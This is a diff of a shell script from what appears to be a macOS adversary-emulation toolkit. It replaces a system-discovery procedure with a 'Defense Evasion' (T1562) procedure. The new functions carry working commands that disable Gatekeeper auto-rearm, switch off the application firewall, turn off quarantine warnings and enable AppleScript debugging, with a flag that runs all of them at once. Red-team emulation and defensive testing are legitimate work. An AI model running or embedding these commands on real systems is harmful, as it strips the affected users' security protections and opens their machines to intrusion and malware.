@@ -1,11 +1,11 @@
 #!/bin/sh
 # POSIX-compliant
-# Procedure Name: system_info
-# Tactic: Discovery
-# Technique: T1082
-# GUID: 0c0f2db0-16fe-49cc-9d0f-2ec457872374
-# Intent: Discovers detailed system information on macOS systems using native commands for enumeration.
-# Author: @darmado
+# Procedure Name: impair_defenses
+# Tactic: Defense Evasion
+# Technique: T1562
+# GUID: e7639395-d542-43c6-b920-3a8d836ed574
+# Intent: Impair macOS security defenses by disabling Gatekeeper, firewall, and quarantine protections using defaults write commands
+# Author: @darmado | https://x.com/darmad0
 # created: 2025-01-27
 # Updated: 2025-05-30
 # Version: 1.0.0
@@ -19,8 +19,8 @@
 #------------------------------------------------------------------------------
 NAME="" 
 # MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with you coresponding tactic
-TTP_ID="T1082" #replace with you coresponding ttp_id
+TACTIC="Defense Evasion" #replace with you coresponding tactic
+TTP_ID="T1562" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -92,27 +92,19 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
-INPUT_HELP=""
-VERBOSE=false
+CHECK_DEFENSES=false
+DISABLE_GATEKEEPER=false
+DISABLE_FIREWALL=false
+DISABLE_QUARANTINE=false
+ENABLE_OSASCRIPT=false
 ALL=false
-SYSTEM=false
-HARDWARE=false
-ENV=false
-NETWORK=false
-BOOT=false
-POWER=false
 
-VERBOSE=False
-ALL=False
-SYSTEM=False
-HARDWARE=False
-ENV=False
-NETWORK=False
-BOOT=False
-POWER=False
+CMD_DEFAULTS="defaults"
+CMD_SUDO="sudo"
+CMD_KILLALL="killall"
 
 # Procedure Information (set by build system)
-PROCEDURE_NAME="system_info"  # Set by build system from YAML procedure_name field
+PROCEDURE_NAME="impair_defenses"  # Set by build system from YAML procedure_name field
 
 # Function execution tracking
 FUNCTION_LANG=""  # Ued by log_output at execution time
@@ -579,39 +571,23 @@ core_parse_args() {
                 fi
                 ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
-        --help)
-            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
-                MISSING_VALUES="$MISSING_VALUES $1"
-            elif [ -n "$2" ]; then
-                INPUT_HELP="$2"
-                    shift
-            else
-                MISSING_VALUES="$MISSING_VALUES $1"
-                fi
-                ;;
-        --verbose)
-            VERBOSE=true
+        --check-defenses)
+            CHECK_DEFENSES=true
+            ;;
+        --disable-gatekeeper)
+            DISABLE_GATEKEEPER=true
+            ;;
+        --disable-firewall)
+            DISABLE_FIREWALL=true
+            ;;
+        --disable-quarantine)
+            DISABLE_QUARANTINE=true
+            ;;
+        --enable-osascript)
+            ENABLE_OSASCRIPT=true
             ;;
         --all)
             ALL=true
-            ;;
-        --system)
-            SYSTEM=true
-            ;;
-        --hardware)
-            HARDWARE=true
-            ;;
-        --env)
-            ENV=true
-            ;;
-        --network)
-            NETWORK=true
-            ;;
-        --boot)
-            BOOT=true
-            ;;
-        --power)
-            POWER=true
             ;;
             *)
                 # Collect unknown arguments for error reporting
@@ -650,15 +626,12 @@ Basic Options:
   -h, --help           Display this help message
   -d, --debug          Enable debug output (includes verbose output)
   -a, --all            Process all available data (technique-specific)
-  --help VALUE              Display help message with detailed command information
-  --verbose                 Enable verbose output with timestamps and user context
-  --all                     Run all system discovery checks (combines all options below)
-  --system                  Basic system information using sw_vers, uname, and hostname commands
-  --hardware                Hardware details using sysctl and system_profiler commands (CPU, memory, serial numbers)
-  --env                     Environment variables and locale settings using env and locale commands
-  --network                 Network configuration using ifconfig and scutil commands (interfaces, DNS)
-  --boot                    Boot and security settings using csrutil and spctl commands (SIP, Gatekeeper)
-  --power                   Power and battery information using system_profiler and ioreg commands
+  --check-defenses          Check current state of security defenses
+  --disable-gatekeeper      Disable Gatekeeper auto-rearm
+  --disable-firewall        Disable macOS firewall
+  --disable-quarantine      Disable LSQuarantine warnings
+  --enable-osascript        Enable AppleScript debugging if disabled
+  --all                     Run all defense impairment commands
 
 Output Options:
   --format TYPE        Output format: 
@@ -1886,77 +1859,58 @@ raw_output=""
 # Set global function language for this procedure
 FUNCTION_LANG="shell"
 
-# Execute functions for --help
-if [ "$HELP" = true ]; then
-    core_debug_print "Executing functions for --help"
+# Execute functions for --check-defenses
+if [ "$CHECK_DEFENSES" = true ]; then
+    core_debug_print "Executing functions for --check-defenses"
+    result=$(check_defense_status)
+    raw_output="${raw_output}${result}\n"
 fi
 
-# Execute functions for --verbose
-if [ "$VERBOSE" = true ]; then
-    core_debug_print "Executing functions for --verbose"
+# Execute functions for --disable-gatekeeper
+if [ "$DISABLE_GATEKEEPER" = true ]; then
+    core_debug_print "Executing functions for --disable-gatekeeper"
+    result=$(disable_gatekeeper)
+    raw_output="${raw_output}${result}\n"
+fi
+
+# Execute functions for --disable-firewall
+if [ "$DISABLE_FIREWALL" = true ]; then
+    core_debug_print "Executing functions for --disable-firewall"
+    result=$(disable_firewall)
+    raw_output="${raw_output}${result}\n"
+fi
+
+# Execute functions for --disable-quarantine
+if [ "$DISABLE_QUARANTINE" = true ]; then
+    core_debug_print "Executing functions for --disable-quarantine"
+    result=$(disable_quarantine)
+    raw_output="${raw_output}${result}\n"
+fi
+
+# Execute functions for --enable-osascript
+if [ "$ENABLE_OSASCRIPT" = true ]; then
+    core_debug_print "Executing functions for --enable-osascript"
+    result=$(enable_osascript)
+    raw_output="${raw_output}${result}\n"
 fi
 
 # Execute functions for --all
 if [ "$ALL" = true ]; then
     core_debug_print "Executing functions for --all"
-    result=$(check_basic_system_info)
+    result=$(check_defense_status)
     raw_output="${raw_output}${result}\n"
-    result=$(check_hardware_info)
+    result=$(disable_gatekeeper)
     raw_output="${raw_output}${result}\n"
-    result=$(check_environment_info)
+    result=$(disable_firewall)
     raw_output="${raw_output}${result}\n"
-    result=$(check_network_config)
+    result=$(disable_quarantine)
     raw_output="${raw_output}${result}\n"
-    result=$(check_boot_security)
-    raw_output="${raw_output}${result}\n"
-    result=$(check_power_info)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --system
-if [ "$SYSTEM" = true ]; then
-    core_debug_print "Executing functions for --system"
-    result=$(check_basic_system_info)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --hardware
-if [ "$HARDWARE" = true ]; then
-    core_debug_print "Executing functions for --hardware"
-    result=$(check_hardware_info)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --env
-if [ "$ENV" = true ]; then
-    core_debug_print "Executing functions for --env"
-    result=$(check_environment_info)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --network
-if [ "$NETWORK" = true ]; then
-    core_debug_print "Executing functions for --network"
-    result=$(check_network_config)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --boot
-if [ "$BOOT" = true ]; then
-    core_debug_print "Executing functions for --boot"
-    result=$(check_boot_security)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --power
-if [ "$POWER" = true ]; then
-    core_debug_print "Executing functions for --power"
-    result=$(check_power_info)
+    result=$(enable_osascript)
     raw_output="${raw_output}${result}\n"
 fi
 
 # Set procedure name for processing
-procedure="system_info"
+procedure="impair_defenses"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2122,79 +2076,81 @@ core_generate_encryption_key() {
 
 # Functions from YAML procedure
 
-# Function: check_basic_system_info
-# Description: check_basic_system_info - Generated from YAML
-check_basic_system_info() {
-
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Basic System Information\n"
-    printf "OS Version:\n$(sw_vers 2>/dev/null)\n"
-    printf "Kernel Information:\n$(uname -a 2>/dev/null)\n"
-    printf "Host Information:\n$(hostname -f 2>/dev/null)\n"
-
+# Function: check_defense_status
+# Description: check_defense_status - Generated from YAML
+check_defense_status() {
+    $CMD_PRINTF "DEFENSE_TYPE|COMMAND|RESULT\n"
+    
+    # Check Gatekeeper status
+    local gatekeeper_result
+    gatekeeper_result=$($CMD_DEFAULTS read com.apple.LaunchServices LSQuarantine 2>/dev/null)
+    $CMD_PRINTF "GATEKEEPER|defaults read com.apple.LaunchServices LSQuarantine|%s\n" "$gatekeeper_result"
+    
+    # Check AppleScript status
+    local osascript_result
+    osascript_result=$($CMD_DEFAULTS read com.apple.osascript 2>/dev/null)
+    $CMD_PRINTF "OSASCRIPT|defaults read com.apple.osascript|%s\n" "$osascript_result"
+    
+    return 0
 }
 
-# Function: check_hardware_info
-# Description: check_hardware_info - Generated from YAML
-check_hardware_info() {
 
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Hardware Information\n"
-    printf "CPU Information:\n"
-    printf "$(sysctl -n machdep.cpu.brand_string 2>/dev/null)\n"
-    printf "$(sysctl -n hw.ncpu 2>/dev/null) processors\n"
-    printf "Memory Information:\n"
-    printf "$(sysctl -n hw.memsize 2>/dev/null) bytes total\n"
-    printf "Hardware Model:\n"
-    printf "$(system_profiler SPHardwareDataType 2>/dev/null | grep 'Model Name\|Model Identifier\|Serial Number' 2>/dev/null)\n"
-
+# Function: disable_gatekeeper
+# Description: disable_gatekeeper - Generated from YAML
+disable_gatekeeper() {
+    $CMD_PRINTF "DEFENSE_TYPE|COMMAND|RESULT\n"
+    
+    # Disable Gatekeeper auto-rearm
+    local gatekeeper_cmd="$CMD_SUDO $CMD_DEFAULTS write /Library/Preferences/com.apple.security GKAutoRearm -bool NO"
+    local result
+    result=$($gatekeeper_cmd 2>&1)
+    $CMD_PRINTF "GATEKEEPER_DISABLE|sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO|%s\n" "$result"
+    
+    return 0
 }
 
-# Function: check_environment_info
-# Description: check_environment_info - Generated from YAML
-check_environment_info() {
 
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Environment Information\n"
-    printf "Environment Variables:\n"
-    printf "$(env 2>/dev/null | grep -v 'PASSWORD\|KEY\|SECRET\|TOKEN' 2>/dev/null)\n"
-    printf "Locale Settings:\n"
-    printf "$(locale 2>/dev/null)\n"
-
+# Function: disable_firewall
+# Description: disable_firewall - Generated from YAML
+disable_firewall() {
+    $CMD_PRINTF "DEFENSE_TYPE|COMMAND|RESULT\n"
+    
+    # Disable firewall
+    local firewall_cmd="$CMD_SUDO $CMD_DEFAULTS write /Library/Preferences/com.apple.alf globalstate -int 0"
+    local result
+    result=$($firewall_cmd 2>&1)
+    $CMD_PRINTF "FIREWALL_DISABLE|sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0|%s\n" "$result"
+    
+    return 0
 }
 
-# Function: check_network_config
-# Description: check_network_config - Generated from YAML
-check_network_config() {
 
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Network Configuration\n"
-    printf "Network Interfaces:\n"
-    printf "$(ifconfig 2>/dev/null)\n"
-    printf "DNS Configuration:\n"
-    printf "$(scutil --dns 2>/dev/null)\n"
-
+# Function: disable_quarantine
+# Description: disable_quarantine - Generated from YAML
+disable_quarantine() {
+    $CMD_PRINTF "DEFENSE_TYPE|COMMAND|RESULT\n"
+    
+    # Disable LSQuarantine
+    local quarantine_result
+    quarantine_result=$($CMD_DEFAULTS write com.apple.LaunchServices LSQuarantine -bool false 2>&1)
+    $CMD_PRINTF "QUARANTINE_DISABLE|defaults write com.apple.LaunchServices LSQuarantine -bool false|%s\n" "$quarantine_result"
+    
+    return 0
 }
 
-# Function: check_boot_security
-# Description: check_boot_security - Generated from YAML
-check_boot_security() {
 
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Boot and Security Settings\n"
-    printf "System Integrity Protection Status:\n"
-    printf "$(csrutil status 2>/dev/null)\n"
-    printf "Gatekeeper Status:\n"
-    printf "$(spctl --status 2>/dev/null)\n"
-
-}
-
-# Function: check_power_info
-# Description: check_power_info - Generated from YAML
-check_power_info() {
-
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Power Information\n"
-    printf "Power Status:\n"
-    printf "$(system_profiler SPPowerDataType 2>/dev/null)\n"
-    printf "Battery Information:\n"
-    printf "$(ioreg -rn AppleSmartBattery 2>/dev/null)\n" 
-    printf "$(ioreg -rn AppleSmartBattery 2>/dev/null)\n" 
-}
+# Function: enable_osascript
+# Description: enable_osascript - Generated from YAML
+enable_osascript() {
+    $CMD_PRINTF "DEFENSE_TYPE|COMMAND|RESULT\n"
+    
+    # Enable AppleScript debugging
+    local osascript_result
+    osascript_result=$($CMD_DEFAULTS write com.apple.osascript OSAScriptingDebugging -bool true 2>&1)
+    $CMD_PRINTF "OSASCRIPT_ENABLE|defaults write com.apple.osascript OSAScriptingDebugging -bool true|%s\n" "$osascript_result"
+    
+    return 0
+} 
 
 
 JOB_ID=$(core_generate_job_id)
